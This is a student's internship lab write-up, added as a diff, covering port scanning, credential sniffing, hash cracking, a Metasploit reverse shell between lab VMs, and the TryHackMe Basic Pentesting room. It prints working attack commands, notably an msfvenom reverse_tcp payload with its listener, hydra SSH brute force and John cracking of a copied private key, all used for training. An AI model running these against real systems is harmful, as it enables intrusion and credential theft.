@@ -1,0 +1,433 @@
+Beginner
+
+1) Find all the ports that are open on the website http://testphp.vulnweb.com/
+
+Steps:
+1. Visited the website given in the task to understand about the working of it. 
+2. Navigated to a Parrot Virtual Machine, for obtaining open ports of the website.
+3. First, tried pinging the given portal to obtain the website IP Address and to check if the portal is responding or not.
+ping http://testphp.vulnweb.com/
+4. After obtaining the IP Address of the portal, used NMAP utility tool which is generally used for network exploration and security auditing.
+5. Used below NMAP Command by using obtained the open port of the website. 
+nmap -sT -Pn 44.228.249.3
+where, -sT is looking for TCP Ports & -Pn is disabling host discovery while running the command
+6. As the output of this command, it shows only Port 80 is open on the given website which shows completion of the task.
+
+2) Brute force the website http://testphp.vulnweb.com/ and find the directories that are present in the website.
+
+1. For finding directories present in the website, here, dirb tool is used.
+2. Dirb tool comes pre-installed in the Parrot OS
+3. Open the terminal window using root privileges. 
+4. Run below Command by using obtained the directories of the website with simple pre-defined wordlist from the dirb tool. 
+sudo dirb http://testphp.vulnweb.com/
+5. Using the wordlist of the tool, few directories are obtained which are hosted on the website.
+6. Try searching on the web using the given directory names in the output. 
+7. After getting access to the directories, this concludes the successful completion of the task. 
+
+3) Make a login in the website http://testphp.vulnweb.com/ and intercept the network traffic using wireshark and find the credentials that were transferred through the network.
+
+1. For spoofing credentials on a login attempt, here Wireshark tool is used which is network protocol analyzer, or packet sniffer.
+2. Naviagte to the website http://testphp.vulnweb.com/
+3. Click on Signup hyperlink button, followed by "signup here" to register yourself on the portal. 
+4. Signup new user page opened. Here, I updated my details in the textbox fields with random characters and clicked on Signup.
+5. After signing up on the website, clicked on Your Profile hyperlink button to login into the website. 
+6. Before entering credentials, opened Wireshark tool using root privileges and selected "eth0" option to start capturing network packets. 
+7. Once packet capturing started, entered my credentials on the login page and clicked on login button. 
+8. With the above step, Wireshark was able to capture packets which contains critical information.
+9. Switched back to Wireshark, and clicked on Analyze button and selected <> option to apply filter to search through the packets.
+10. On the Filter, first selected, Packet Details from the drop down list, followed by selecting Narrorw (UTF-8/ASCII) and finally selecting string from the list. This is the configuration of the search filter for the string which I want to search in the search box.
+11. In the search box, I tried putting multiple strings like, "password", "passwd", "pass", out of which I got successful result using "pass" keyword.
+12. Using the search filter, got the credentials in the plain text in network packets where I found Username and Password successfully.
+13. This concludes the completion of this task successfully.
+
+
+Intermediate
+
+1) A file is encrypted using Veracrypt (A disk encryption tool). The password to access the file is encrypted in a hash format and provided to you in the drive with the name encoded.txt. Decode the password and enter in the vera crypt to unlock the file and find the secret code in it. The veracrypt setup file will be provided to you.
+
+1. In this task, first, I downloaded all the supportive files given in the Drink link in the Tasks file which was in zipped format. 
+2. Then, to perform the activity task, first I unzipped & extracted all the files given in the zipped format, which includes, 2 .exe application files and 2 text files. 
+3. To begin with, as per the task, I intalled "VeraCrypt Setup 1.26.7.exe" which was used used to enrypt the text file named "shadowfox veracrypt.txt". 
+4. Once the software tool is installed successfully, I started looking for UI and working of the application.
+5. After understanding the application, selected a random drive name, here I used "P", and clicked on select file button to selected the encrypted file. 
+5. After selecting the file I clicked on Mount button to mount the file as per working of the tool, a screen popped up for asking the password. Then I observed there is a file named, "encoded.txt.txt" which contains password in hased format. 
+6. I performed a random search on Google for hash to plain text converter & I visited https://crackstation.net/ portal to convert hashed text into plain text. 
+7. After putting hashed text in to the converter, I got the plain text password as "password123". 
+8. Then I moved back to Veracrypt tool and again selected the drive as "P", and selected the file using select file button from the extracted folder which was downloaded from Google Drive and clicked on Mount button.
+9. After clicking on Mount button, it asked me for a password. I entered the password which I extracted from the hashed password. After which I observed that the file which I mounted in the previous step, is mounted successfully. 
+10. I opened File Explorer of my VM and clicked on This PC. Then I observed a new drive has been created named as "P", followed by opening the drive.
+11. After opening the P drive, observed there is a file named "shadowfox cybersecurity", which is extracted file after mounting  it in the Veracrypt extraction tool.
+12. This file gives me the final secret code which is "never giveup". 
+13. This concludes the successful exploitation of this task of extracting the password from a hashed format and an ecrypted file using Veracrypt.
+
+
+2) An executable file of veracrypt will be provided to you. Find the address of the entry point of the executable using PE explorer tool and provide the value as the answer as a screenshot.
+
+1. As I have successfully exploited and completed previous tasks by downloading a zipped folder from the Google Drive, followed by extracting it and exploiting it and finding the secret code, I already have necessary files downloaded on my VM System.
+2. To perform this task, I primarily need executive application named, "VeraCrypt Setup 1.26.7.exe" which is going to be searched in detail and "PE.Explorer_setup.exe" which is going to be used to search Veracrypt executable application file.
+3. I started this task by first intalling PE Tool which I used for finding Address of Entry Point of the Veracrypt application.
+4. After installing the PE tool, I simply clicked on File option which is placed at top left corner of the application.
+5. I selected the Veracrypt executable file, and opened it in the PE Explorer Tool for the details.
+6. After selecting the file, application did its magic and helped me to extract Address of entry point as selected in the Screenshot below. 
+7. This concludes the successful completion and exploitation of the Veracrypt tool using PE Explorer Tool. 
+
+
+3) Create a payload using Metasploit and make a reverse shell connection from a Windows 10 machine in your virtual machine setup.
+
+1. For completion of this task, I have used 2 different system. 1 VM System I have used as Victim Machine and another VM Machine I have used as Attacker Machine. Here, Attacker machine is Parrot OS and victim machine is Windows 10 OS.
+Attacker Machine (Parrot OS) IP: 192.168.101.136
+Victim / Target Machine (Windows 10) IP: 192.168.101.130
+2. I started exploitation of task by creating of the payload first. I opened terminal in the Parrot OS using root privileges. 
+3. As I am using Windows OS as my Targert or Victim Machine, I preferred using .exe file as my payload base and for which I ran below command to create the payload. I have specified local host and local port on which reverse shell will obtain is specified.
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=192.168.101.136 LPORT=444 -o Inter_Task3.exe
+4. After running the above command, I successfully created the payload and I made sure the payload is created using listing my all the files present in the folder.
+5. Now, being as an Attacker, my next priority task is to send this created payload to the Victim and make sure Victim runs this exe file. But, for the lab purpose, I am acting as both Attacker and Victim, I have kept the payload filename easy to guess and used Python3 for Serving the current working directory over HTTP to the Attacker Machine. For this I used below command:
+python3 -m http.server
+6. Using this command, I was able to access current working directory of the Attacker Machine into Victim's Machine by running the below command on the Victim's machines browser: 
+http://192.168.101.136:8000
+7. Then after getting access of Attacker's current working directory, I searched for the expected .exe file named "Inter_Task3.exe" and I downloaded it. 
+8. For the task purpose, I disabled all the firewall and real time detection and protection rules of windows 10 as this file might give an error while downloading it. Also, Google Chrome itself has a security procedure which denied to download the file.
+9. Now, I switchched back to the Attacker's machine for further setup and that is starting the listener to take the session of the victim when victim will run the expected executable file.
+10. On the Attacker machine, I opened a new terminal window with root privileges to start a tool named "msfconsole". msfconsole is a tool which helps us to configure the settings which helped me to take shell of the victim machine. 
+11. To begin the configuration of msfconsole, I ran the command as "msfconsole -q" to start the msfconsole in quite mode. 
+12. Further, I used the exploit as multi/handler using the below command:
+use exploit/multi/handler
+13. Further, I set the payload in the msfconsole configuration which we used to create the payload in exe file. To do so, I ran the below command:
+set payload windows/meterpreter/reverse_tcp
+14. Further, I ran the command of setting Local host and local port where all the traffic will be coming. Here, host IP and port number shoul be same which I used while creating the payload. 
+set LHOST 192.168.101.136
+set LPORT 444
+15. Further, I ran the below command to check if all the set configurations are correct or not:
+show options
+16. After validating the configurations, I ran the below command and wait till victim runs the .exe file which contains payload:
+run -j
+17. Next, I moved to victim machine which is windows 10 and ran the .exe file normally. It gave me an error from Windows Default Antivirus Protection that this file contains risk. As this is for test purpose, I ran the file using show detials button and clicked on "Run Anyway". Output of this file is literally nothing. I mean after clicking on this file, it just take a moment to laod something as per victim's view, but it shows nothing. But if I look from Attacker's view, attacker has got the access to the system of victim.
+18. Now I switched backk to Attacker machine which is parrot, and ran the command "sessions -i" which helped me to udnerstand that I have got the session of victim's machine on my system.
+19. To use the session of victim, which I have just obtained from using the .exe file, I ran the below command:
+session -i 1. Here, I used 1 because I am having only 1 session as of now. 
+20. After inserting into the victim's machine, I tried running few basic commands by which I get the confirmation of I have successfully exploited the victim's machine. 
+21. At last, I ran the "shell" command to actually take the control of victim's machine Command Prompt to perform the malicious activities. 
+22. This step shows that I have successfully exploited and gain the reverse shell access of the victim machine using the msfconsole and msfvenom tool. 
+
+
+Hard
+
+2) Using the Tryhackme platform, launch the Basic Pentesting room. Penetrate the room and answer all the questions that are given to you on the website and also create a detailed document of the process of penetration and how you did it.
+
+NOTE: For this task level, I have used a second OS which is my Parrot OS. I have not used a machine given by TtyHackMe. 
+
+A. Deploy the machine and connect to our network
+
+1. As per the task requirement, first I navigated to https://tryhackme.com/, followed by making an attempt of login in the portal as I was already having an account on the portal.
+2. After login, I landed on the Home Dashboard of the portal. Then I clicked on Search icon from the webpage which is placed at somewhere at top & in middle to right side of the nav bar.
+3. I searched for Basic Pentesting Room which gave me an output of 3 basic rooms based my search and 3rd output from the list is the one what I have searched for and that is "Basic Pentesting room". I clicked on it to Join room which gave me a platform to start the room and deploy the machine. 
+4. Then, I clicked on Access Machine, followed by Start Attachbox to access the machine. 
+5. Now, I clicked on [OpenVPN configuration file](https://tryhackme.com/access) which redirected me to Download configuration file for accessing TryHackMe Network. Here, I selecte the "IN-Regular-1" VPN Server to download the configuration file. 
+6. Further, on the same page, I moved to the next section which was "Connect to our network to hack machines" from which I clicked on "OpenVPN (Advanced)" which is for free as I am accessing free labs here. Now, a details page will open at the bottom of the same page. I scrolled down to the video and understood what are the required procedure which I need to follow for the connneciton. The video suggets, I clicked on  [Download the OpenVPN GUI application](https://openvpn.net/community-downloads/), followed by expanding the recent release and downloading "Windows 64-bit MSI installer". Once done, I ran the downloaded file using administrative privilegs. 
+7. In the bottom right of your screen, on the task bar, press the click the icon that looks like an up arrow (^). There should be an icon within the new window that looks like a monitor with a plug, right-click. This is where you will manage your OpenVPN connections.
+8. Next hover over Import, select Import file and navigate to your OpenVPN profile.
+9. Finally, right-click on the OpenVPN icon again, select Connect and wait for it to notify you that you have been connected successfully.
+10. With this, I successfully Deployed a machine in TryHackMe Room and connected to their network.
+Note: in this task, answer is not needed to put in the answer box. 
+
+B. Find the services exposed by the machine
+
+1. After deploying the machine and connected to the TryHackMe network, I moved ahead with the next task which is obtaining the open services, i.e., open ports on the machine.
+2. Here, first I need to find IP Address of the machine which I was accessing. To do so, I have 2 options: First, I can see IP Address at the top middle side of my Mchine. Second is, I ran the below command to get the IP Address:
+ifconfig
+3. To do this, I chose to use Nmap which is a powerful and versatile tool for network exploration and security auditing that can be used for host discovery, port scanning, service and OS detection, etc., under which I ran the below command which helped me to find all the open services / ports on the machine.
+sudo nmap -sT 10.10.69.18 //Here, IP Address is changing as I have performed this task in multiple sessions
+4. By using this, I successfully completed the task of exploiting open services / ports on the machine.
+Note: In this task, answer is not needed to put in the answer box. 
+
+C. What is the name of the hidden directory on the web server(enter name without /)?
+
+1. In this task of exploiting hidden directoty on the web server, I have used exploited the task using 2 different tools. One is using the utility tool named "Dirbuster" which is GUI tool and another by using utility tool named "gobuster" which is command line utility.
+2. Here, I am showing detailed steps using the Command line utility tool that is GOBUSTER using the root privileges. 
+3. To perform the activity and obtian the hidden directory, below command I ran on the terminal:
+sudo gobuster dir -u 10.10.69.18 -w /usr/share/wordlist/dirbuster/directory-list-lowercase-2.3-medium.txt --exclude 472
+4. To understand the command, here is the breakdown below:
+sudo: used to run command using root privileges
+gobuster: used to start the command and initialise the tool
+dir: used for searching for directory
+-u IP_Address: used to specify IP Address of the victim machine
+-w wordlist: used to specify the wordlist contains words which are in common to use from which gobuster will take the word and search for an directory
+--exclude 472: used to exclude status code which was giving me an error while running the command without it
+5. Using the above command, I got a first output in the terminal as "/development" and gobuster tool started finding another folders within the /development directory. 
+6. I was waiting for the command for the completion, but as it was taking a lot of time, I tried submitting the asnwer as "/development" without double quotes and slash infron of it, and boom it worked. 
+7. By entering "development" as my answer for the question, I successfully exploited the hidden directory in the web server using gobuster command line utility tool.
+
+D. User brute-forcing to find the username & password
+E. What is the username?
+
+1. In this task of burte-forcing to find username and password, I used a tool named, "smbmap" which allows users to enumerate samba share drives across an entire domain. 
+2. To perform this activity, I begin with running the below command: This command Scans the SMB shares on the given IP address and shows the available shares on victim machine.
+smbmap -H 10.10.69.18
+where, -H is used for specifying the Host
+3. My next aim is to get the detailed view of the shares from the output which I got in the previous command. Now, I ran the smae command using recursive manner to get the expected output. Here, I have used -R for getting the output as recursively list files.
+smbmap -H 10.10.69.18 -R
+4. By running the above command, I got the detailed listing of files from the shares which I got by running the same command without using recursive intention.
+5. Here, there are two shares which I got to see and those are "Anonymous" and "IPC$". I observed three files under "Anonymous" share out of which 2 files are hidden and 1 file is intresting to go further, and that file is saved with the name as "staff.txt". Now, I started investigating further to to get access on that text file.
+6. To read the file, initially I simply tried to get access of that by using the file reading tools like cat, nano, vi, pluma, etc. which surely did not work. So, further investigation, I tried below command using smbclient to get access on the share Anonymous for reading the file.
+smbclient \\\\10.10.69.18\\Anonymous
+7. It asked me a password on which I had no idea what to write. And I simply tested by typing my Parrot Machine's root password which successfully helped me to get access on the share. 
+8. Next, I tried directly accessing the files again by simply using the file reading tools like cat, nano, vi, pluma, etc. which again did not work.
+9. Upon further investigation, I understand the working of "get" command which I need to use here which is used to copy the required file from different share into our own machine and here my machine is Parrot. This means to copy staff.txt from Anonymous Share into my Parrot OS directory. I ran the below command to achieve this target:
+get staff.txt
+10. Further, I simply navigated to my Downloads folder where I am expecting to get the file which I copied from the share Anonymous. 
+11. I double clicked on the staff.txt which is present in my Downlaods folder, and I observed an announcement for the staff which contains 2 usernames. One is Jan and another is Kay. 
+12. I tried submitting one name at a time starting with Jan in the answer box in the TryHackMe user interface question box. I was able to acheive this task by putting username as "Jan" and I successfully exploited the task of brute-forcing the usernames and immediate task of exploiting the username. 
+
+F. What is the password?
+
+1. From the above task, I have exploited the two username, One is Jan and another is Kay. Now, to obtain the password for these users, my goal is to brute-force on these usernames using brute-forcing tools.
+2. To my personal choice, I prefer in-built utility of linux based OS flavours that is HYDRA, which is parallelized network login cracker built into various operating systems.
+3. To begin the brute-frocing, first I navigated to the wordlist directory to ensure the password wordlist is present in the OS or not. Here, I wanted to use rockyou.txt wordlist to brute-force on the username to fetch the password as this wordlist is best for an attacker to use effifiently and it contains words in every aspect.
+4. I used ls command to list all the files under wordlist directory for which I used the below command:
+ls /usr/share/wordlist/rockyou.txt
+5. Once, it is confirmed that wordlist is present, I copied the desired wordlist into my Downloads folder as it is quite easy for me to navigate in my Downloads folder. To do so, I ran the below command:
+cp /usr/share/wordlist/rockyou.txt /Downloads/
+6. Once it is copied to my desired location, I initiated the tool named hydra which I used to brute-forcing the username to get the accurate password. To do so, I ran below command:
+hydra
+7. This command showed me the syntac which I need to use for running the hydra tool and what other variable I can use which are integrated in the tool hydra.
+8. After evalutating the syntax, I understood that I need to give username, wordlist which contains passwords which hydra need to try on the user and I also need to give IP along with the service on which that user resides and I need to try to connect machine or system. To acheive this, I ran the below command:
+hydra -l jan -p Downloads/rockyou.txt ssh://10.10.69.18
+where, -l used to specify on what username I need to brute-force
+-p used to specify the wordlist
+ssh://IP_Address used to select the running service on the system and system's IP Address (Here, I knew that SSH is active running service on the system as I checked already what are the open running servies usng nmap in Task 2/B)
+9. After running the above mentioned command, it took a while to successfully run the command as for the username as jan, it is trying all the possible combination which are mentioned in the wordlist rockyou.txt.
+10. After a while, the command stopped running after giving me an successful password combination. The tool says, for the username jan, while taking ssh, "armando" is the correct accurate password of the system which I can use for taking ssh and exploting further tasks and goals.
+11. with this, I successfully burte-forced the system of TryHackMe using the username as jan on the open running service ssh. 
+
+G. What service do you use to access the server(answer in abbreviation in all caps)?
+
+1. To perform this activity, first I need to know proper accrately active running credentials of any user who is having access on the server. 
+2. To do so, in the above tasks, I have exploited the system and found username and password. Also, while brute-forcing to find the password, I used one of the open running service from the system and that is "SSH". 
+3. To do so, I ran the below command:
+ssh jan@10.10.69.18
+4. After running the above command, it asked me for a password, on which I entered the password which I exxploited in one of the above tasks. 
+5. With this process, I successfully exploited the server and accessed the server using SSH Service.
+6. So, while successfully concluding the task, I used "SSH" service to access the serer.
+
+H. Enumerate the machine to find any vectors for privilege escalation
+
+1. To perform the enumeration on the system to find all the possible vectors, I mean all the possible ways to escalate privileges from the user Jan which I exploited above, my goal is to use LinEnum tool, which is used to make the process of finding an attack vector easier.
+2. To start perfroming the task using LinEnum, I started downloading the LinEnum tool first into the server which I accessed in the previous task by using the SSH service which is alreaddy open and running on the target machine. 
+3. To download the LinEnum tool, I ran the below command:
+wget https://github.com/rebootuser/LinEnum
+4. While running the command, I observed that there is nothing worth to wait until the command runs successfully and extract it. So, I changed my method for downloading the  tool by running the below command:
+git clone https://github.com/rebootuser/LinEnum
+5. Onve git cloning is done successfully, I navigated to the folder where it was downloaded and tried running the shell script for LinEnum tool. For this, I ran the below command:
+cd /HOME/JAN/LinEnum
+chmod +x LinEnum.sh
+./LinEnum
+6. After running the above command, I noticed that, Jan user is not having any privileges or access to install and run any tool. 
+7. Now, to accomplish the task, I switched my pattern of exploitaiton by installing the LinEnum tool into my host machine followed by sending it to the Target machine under the jan user using command line utility. 
+8. To do this, first I switched back my host VM Machine that is Parrot OS and opened the terminal using root privileges and ran the same commands which I ran above which are:
+git clone https://github.com/rebootuser/LinEnum
+9. Once the command successfully clones the repo in my system, I navigated to the folder where it was downloaded and tried sharing the shell script of LinEnum tool to the server victim machine into the tmp folder as that folder is something which is accessible and able to run from the tmp folder. For this, I ran the below command:
+cd /home/atharva/LinEnum
+scp LinEnum.sh jan@10.10.69.18:/tmp
+10. Further, I moved to the ssh session which is currently going on and ran below command in sequence:
+cd /home/jan/tmp
+chmod +x LinEnum.sh
+11. Till the above command, I have given shell script execute permission in the Jan user under the tmp directory. But now, I need to run the shell script to look for all the details about the server machine which can show me all the vectors and possible paths to escalate my privileges and do such things which are not expected to d by a user who is not supposed to do. 
+./LinEnum
+12. Once the script started running after the above command, it started loading all the informatiom with the details from which I surfed all the data and gathered all the information which I need to exploit the system further and complete the tasks.
+13. With this, I successfully exploited the task of gathering all the vectors using LinEnum tool which can help me escalate my privileges in the victim server machine under the user jan.
+
+I. What is the name of the other user you found(all lower case)?
+
+1. In this task of burte-forcing to find username and password, I used a tool named, "smbmap" which allows users to enumerate samba share drives across an entire domain. 
+2. To perform this activity, I begin with running the below command: This command Scans the SMB shares on the given IP address and shows the available shares on victim machine.
+smbmap -H 10.10.69.18
+where, -H is used for specifying the Host
+3. My next aim is to get the detailed view of the shares from the output which I got in the previous command. Now, I ran the smae command using recursive manner to get the expected output. Here, I have used -R for getting the output as recursively list files.
+smbmap -H 10.10.69.18 -R
+4. By running the above command, I got the detailed listing of files from the shares which I got by running the same command without using recursive intention.
+5. Here, there are two shares which I got to see and those are "Anonymous" and "IPC$". I observed three files under "Anonymous" share out of which 2 files are hidden and 1 file is intresting to go further, and that file is saved with the name as "staff.txt". Now, I started investigating further to to get access on that text file.
+6. To read the file, initially I simply tried to get access of that by using the file reading tools like cat, nano, vi, pluma, etc. which surely did not work. So, further investigation, I tried below command using smbclient to get access on the share Anonymous for reading the file.
+smbclient \\\\10.10.69.18\\Anonymous
+7. It asked me a password on which I had no idea what to write. And I simply tested by typing my Parrot Machine's root password which successfully helped me to get access on the share. 
+8. Next, I tried directly accessing the files again by simply using the file reading tools like cat, nano, vi, pluma, etc. which again did not work.
+9. Upon further investigation, I understand the working of "get" command which I need to use here which is used to copy the required file from different share into our own machine and here my machine is Parrot. This means to copy staff.txt from Anonymous Share into my Parrot OS directory. I ran the below command to achieve this target:
+get staff.txt
+10. Further, I simply navigated to my Downloads folder where I am expecting to get the file which I copied from the share Anonymous. 
+11. I double clicked on the staff.txt which is present in my Downlaods folder, and I observed an announcement for the staff which contains 2 usernames. One is Jan and another is Kay. 
+12. In the previous taks of finding uername, I submitted the another username which I did not try in the last taks, i.e., "kay". I entered as kay in the answer box in the TryHackMe user interface question box. I was able to acheive this task by putting username as "Kay" and I successfully exploited the task of finding the another username.
+
+J. If you have found another user, what can you do with this information?
+
+1. While performing the activity of finding all the possible paths and vectors to escalate my privileges in the victim server machine under the jan user, I found that under the user of kay, there are few hidden folders, and as per my thinking, it might be helpful to dig further under user kay to find all the hidden files and directories.
+2. To do so, first, I ran the below command to list all the files and directories, which are hidden and not hidden as well. This command will also tells me what are the permission a particular file contains:
+ls -a /home/kay
+3. Just for information, I ran this command from the SSH which I took earlier in the user Jan. 
+4. This command showed me there are numerous hidden directories and out of which one directory froze my eyes. And that directory is ".ssh". There is another file named pass.bak but that file is not directly accessible from the user jan. So, I tried listing all the files of ".ssh" diretoty using the below command:
+ls /home/kay/.ssh
+5. This helped me to find all the files present under .ssh diectory and those files are authorized_key, id_rsa and id_rsa.pub. I decided to keep diggin in this folder and files present in it as it contains files with authentication key, encrypted hashed key. My thinking was this might help me crack the final password. 
+6. But, here to my reference, I started the procedure of decrypting the file using John The Ripper in the John The Ripper fromat. 
+7. To do this, first, I copied all the content of id_rsa file into a new file in my host Parrot OS. Once done, then I started running the below command which I ran for Converting Private Key to John the Ripper Format:
+python3 /usr/share/john/ssh2john.py id_rsa > rsa_hash.txt
+8. After running the above command, I encountered with the below error:
+Traceback (most recent call last):
+  File "/usr/share/john/ssh2john.py", line 193, in <module>
+    read_private_key(filename)
+  File "/usr/share/john/ssh2john.py", line 103, in read_private_key
+    data = base64.decodestring(data)
+AttributeError: module 'base64' has no attribute 'decodestring'
+9. On the above error, I researched on it, and got to know that, after hitting a Python 3 compatibility issue with the ssh2john.py script, the function base64.decodestring() was removed in Python3 and replaced with base64.b64decode(). So, wiht the help of pluma file editor, I modified the function which is deprecated with the one which is in active state now. To do so, I ran below command:
+pluma /Downloads/id_rsa
+Replaced base64.decodestring() with base64.b64decode()
+saved the file and closed the pluma file editor
+10. Once the file is saved, I ran the below command again for onverting Private Key to John the Ripper Format on which I did not get any error or output which is expected as the output of the command:
+python3 /usr/share/john/ssh2john.py id_rsa > rsa_hash.txt
+11. In the process of decrypting the file into John The Ripper format, next step is to Run John the Ripper tool to Crack It and obtian a file in the John The Ripper format:
+john rsa_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+12. As the output of this comamnd, this gave me the login password for the user "kay" in the plaintext format where the password is "beeswax". 
+13. To answer to the question of this task, I was able to do the password cracking of another user which I found while exploiting the active usernames from the victim server machine. 
+14. With this information, I am successfully concluding the task by saying, password of both the users were obtained in the plain text by using the information which I had received earlier.
+
+K. What is the final password you obtain?
+
+1. As in the previous task I was able to successfully exploit password of the another user whose credentials were not available with me, next, I tried to take ssh into the same victim server machine using the user kay whose password I exploited in the last task. 
+2. To do so, I ran the below command to take ssh into the victim server machine using the user kay:
+ssh kay@10.10.159.12
+3. After running the above command, I encountered an error which did not let me take ssh into the server machine. To avoid it, in the command, I gave id_rsa file as input to the ssh command as a aunthorised_key. But unfortunately, it again gave me an error as could not resolve hostmame id_rsa. To try this I has entereed below command:
+ssh id_rsa kay@10.10.159.12
+4. Upon the error I encountered, I researched on the error as I observed that I need to add & run option which is "-i" which will take id_rsa file as input file. For this, I ran the below command:
+ssh -i id_rsa ssh@10.10.159.12
+5. After running the above command, it asked me for a password, on which I entered the password which I exxploited in one of the above tasks, that is "beeswax". With this process, I successfully exploited the server and accessed the server using SSH Service under kay as user.
+6. After this, I simply ran ls command to list all the files which are present under present working directory in the user Kay. This gave me output as only 1 file is present in the present working directory. This file seems suspicious as the filename saya, "pass.bak".
+7. Now, without investing efforts at any other logic, I tried looking into the file from the present working diretory which is pass.bak by using the cat file editor command line utility. This utility helps usually to create a text file, append a text file, and read a text file if logged in user having appropriate permissions. For this, I ran the below command:
+cat pass.bak
+8. To my surprise, this file is not password encrypted and kay user from which I am currently logged in having read access to the file which I am looking for. And as output of the above command, it directly gave me a long string in the plain text. I copied and tried pasting the same in the last question of the task list on TryHackMe. It successfully worked and this helped me to complete all the tasks under Basic Pentesting Room on TryHackMe Platform.
+9. With this, I successfully exploited the final password which was presemt amd accessible under kay user. 
+10. This concludes the executon and exploitation of all the Tasks under Basic Pentesting Room on TryHackMe Platform with 100% status completion as shown in the below POC. 
+
+
+
+References:
+1. https://tryhackme.com/
+2. https://olivierkonate.medium.com/
+3. https://github.com/
+4. https://osboxes.org/
+
+
+
+Specify what you have done till now
+*
+If Yes, kindly state till which level you have completed and explain what you have understood so far.
+
+If No, kindly specify the reason why you didn't start yet.
+
+We will review your progress, and if it appears that you have not yet started, our team will reach out to verify your work. If you remain inactive and we are unable to establish further communication, we may have to remove you from the program.
+0 points
+
+
+Yes, I successfully completed all tasks associated with the ShadowFox Internship from Beginner to Hard levels. As a Beginner, I examined the open ports, directory brute-forced, and captured network traffic using Nmap, Dirb, and Wireshark. For Intermediate, I decrypted files with VeraCrypt, analyzed executables through PE Explorer, and created reverse shell connections using Metasploit. At Hard level, I finished the Basic Pentesting room on TryHackMe, where I found and exploited various vulnerabilities, brute-forced credentials, escalated privileges, and extracted sensitive data using smbmap, hydra, LinEnum, John The Ripper, etc. With these tasks, I acquired practical experience in penetration testing, network security, and ethical hacking frameworks, which upgraded my technical capabilities and understanding of cybersecurity principles.\
+
+
+
+
+Obtaining the open ports on a website 4
+Brute-forcing attack using dirb tool for directory exploitation 7
+Credentials sniffing in plain text on a test account 9
+Credentials sniffing in plain text on a personal account 9
+Decryption of Hashed password using web tool 11
+File mounting in the Veracrypt software for the file decryption 11
+File mounted successfully for the decryption New drive creation in the File Explorer 12
+New drive creation in the File Explorer 12
+Final secret code extraction using Veracrypt tool 13
+Exploitation of Address of Entry Point 14
+Creation of payload using “msfvenom” 17
+Sending payload to victim user 18
+Victim downloading the payload 18
+Setting up configuration for the reverse shell using msfconsole 19
+Validating the configuration in msfconsole 19
+Executing the payload in Victim’s Machine 20
+Obtaining the session after running the payload 20
+Exploitation of victim by accessing the shell using reverse code execution payload 20
+Obtaining the open ports of the simulation machine 29
+Exploitation of finding hidden directories using gobuster command-line tool 29
+Exploitation of finding hidden directories using dirbuster GUI tool 30
+Steps for exploitation the active usernames on the system 30
+Successful exploitation for obtaining the usernames 31
+Cracking password of a user using brute-forcing tool “hydra” 31
+Pushing LinEnum shell script file into exploited users temp directory 31
+Configuration and executing LinEnum tool for gathering all the details about the system for privilege escalation 32
+Enumerating directories under different user for further exploitation 32
+Converting encoded file into John the Ripper format for the brute-forcing and exploitation of login credentials 32
+Successful exploitation of final password which resides under the user “kay” 33
+Validation of completion of the Basic Pentesting Simulation Room 33
+Successful completion of all the questions of Basic Pentesting Simulation Room 34
+
+
+During the task completion for the course, I performed a variety of hands-on cybersecurity tasks that strengthened my understanding of penetration testing, network traffic analysis, encryption handling, binary analysis, and payload exploitation techniques. Successful completion of this internship provided an opportunity to take in-depth knowledge of web services & services that are present on a computer system and the importance of their existence. By using these services, different computer systems connect to each other and communicate with each other over the internet using different network services, protocols, and devices. Based on the internship tasks, it also helped me to understand different vectors of privilege escalation and different tools and methodologies for performing brute-force attacks like Hydra, due to which any attacker can gain active & valid login credentials of any user, due to which an attacker can log in and steal confidential data to which an attacker is not intended to get access. Further, it also gives an opportunity to learn, understand, and implement a network packet sniffing technique, where an attacker can intercept the network packages flowing in the network into sniffing tools like Wireshark. This is a platform to monitor all the network packets and get the details from the packet easily, which may include login credentials in plain text. Next, it helped to improve understanding of different encryption and decryption techniques along with their tools, which can be used to safeguard confidential data in the form of different files like text files, Word files, PDF files, etc. By doing this, the next content was to exploit a system to take the reverse shell and access the machine. At last, this course task list was finished by exploiting and completing a room that was hosted on the TryHackMe platform, where, from the attacker's perspective, all the knowledge can be tested on a practical basis, which includes all the tasks that were performed initially in individual tasks. Overall, this internship provided me with critical technical skills, enhanced my practical cybersecurity knowledge, and helped me understand the importance of securing systems against real-world cyber threats.
+
+During the task completion for the course, I performed a variety of hands-on cybersecurity tasks that strengthened my understanding of penetration testing, network traffic analysis, encryption handling, binary analysis, and payload exploitation techniques. The opportunity to gain a thorough understanding of web services and other services found on computer systems, as well as the importance of their operation, became possible by the successful completion of this internship. Through these services, various computer systems use various network services, protocols, and devices to connect to and communicate with each other over the internet. The knowledge I have gained of various methods of privilege escalation and the various tools and techniques for performing brute-force attacks, such as Hydra, which allow an attacker to obtain the active and legitimate login credentials of any user and use them to log in and steal confidential information that an attacker is not supposed to have access to, has also improved as a result of the internship tasks. Additionally, it offers the chance to acquire knowledge, understand, and apply a network packet sniffing technique, which allows an attacker to intercept network packages as they flow through the network and feed them into sniffing tools like Wireshark. This platform allows you to easily monitor all network packets and extract information from them, which may include login credentials in plaintext. Following that, it assisted in enhancing understanding of various encryption and decryption methods and the tools they require, which can be employed to protect confidential and sensitive data stored in various file formats, such as Word, PDF, and text documents. Exploiting a system to obtain the reverse shell and gain access to the machine was the next step in this process. Finally, this course task list was completed by exploiting and finishing a room hosted on the TryHackMe platform. From the attacker's point of view, all of the knowledge can be evaluated practically, including all of the tasks that were initially completed in individual tasks. Overall, this internship provided me with critical technical skills, enhanced my practical cybersecurity knowledge, and helped me understand the importance of securing systems against real-world cyber threats.
+
+I express esteemed gratitude and sincere thanks to ShadowFox & my worthy internship guide Mr. Surendharan, assistant guide Ms. Manasa and my co-ordinator Mr. Aakash for their guidance and support throughout my internship. Our vocabulary is yet to find suitable words benefiting to high standard of knowledge and extreme sincerity and affection with which co-ordinator has regularly encouraged me to put heart and soul in this work.  
+It illustrates how academic knowledge and practical skills can be combined in a job environment, describing my internship experience. It represents education, growth, and success in the cybersecurity .
+I am grateful to ShadowFoc Org. for providing with resources which led to successful completion of this internship. 
+Please accept my respect and gratitude.
+
+My goal is to execute, exploit and successfully complete all the tasks which are looped in this internship along with creating a detailed report of the same which will include detailed steps along witht the challanges which I faced during the exploitation.  The aim of this internship will be:
+1. Understanding all the core concepts of the cybersecurity, tools which will be using for the execution, expected output of the task to mark it as completed. 
+2. Creation of Virtual Machines, lab context set-up and configuration of Simulation room available on TryHackMe platform.
